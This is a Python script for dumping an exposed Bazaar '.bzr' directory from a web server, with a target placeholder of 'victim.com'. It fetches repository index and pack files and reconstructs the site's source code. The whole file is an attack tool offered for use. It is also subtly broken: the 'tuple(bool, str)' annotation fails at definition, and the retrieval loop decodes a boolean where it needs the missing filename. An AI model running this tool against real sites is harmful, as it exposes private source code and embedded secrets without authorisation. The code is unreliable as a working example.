#!/usr/bin/python3
# Author : shpik (shpik.korea at gmail.com)

import os
import requests
import subprocess

import argparse

def check_validation()->tuple(bool, str):
	p = subprocess.Popen(["bzr","check"],stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	_,m = p.communicate()
	if b"ERROR" not in m:
		return True, ""
	return False, m.split(b".bzr/")[1].split(b"\'")[0].split(b"/")[-1].split(b".")[0]

def get_data(url: str)->str:
	try:
		r = requests.get(url)
		return r.content
	except requests.exceptions.RequestException as e:
		print(e)
		exit(1)

def do_dump(url: str)->None:
	if url[-1] != "/":
		url += "/"
	prefix = ".bzr/"
	initials = [
		"repository/pack-names",
		"README",
		"checkout/dirstate",
		"checkout/views",
		"branch/branch.conf",
		"branch/format",
		"branch/last-revision",
		"branch/tag",
	]
	restore_path = [
		["repository/indices/", ".cix"],
		["repository/indices/", ".iix"],
		["repository/indices/", ".rix"],
		["repository/indices/", ".six"],
		["repository/indices/", ".tix"],
		["repository/packs/", ".pack"]
	]
	print("[!] Target : {}".format(url))
	print("[+] Start.")
	for initial in initials:
		print("[+] GET {}".format(initial))
		with open(prefix+initial,"wb") as f:
			r = get_data(url + prefix + initial)
			f.write(r)
	
	while 1:
		is_valid, empty_file  = check_validation()
		if is_valid:
			break
		print(f"[+] GET {empty_file}.")
		for res in restore_path:
			np = prefix+res[0]+is_valid.decode("utf-8")+res[1]
			restore_url = url+np
			with open(np,"wb") as f:
				r = get_data(restore_url)
				f.write(r)

	print("[*] Finish!")


if __name__=="__main__":
	parser = argparse.ArgumentParser(description="bazaar dump tools developed by shpik(shpik.korea at gmail.com)")
	parser.add_argument("-u","--url",
					help="url for dump.(e.g. http://victim.com/")
	parser.add_argument("-o","--output", default="output",
					help="output dir.")

	args = parser.parse_args()
	os.mkdir(args.output)
	os.chdir(args.output)
	os.system("bzr init")
	do_dump(args.url)
	os.system("bzr revert")
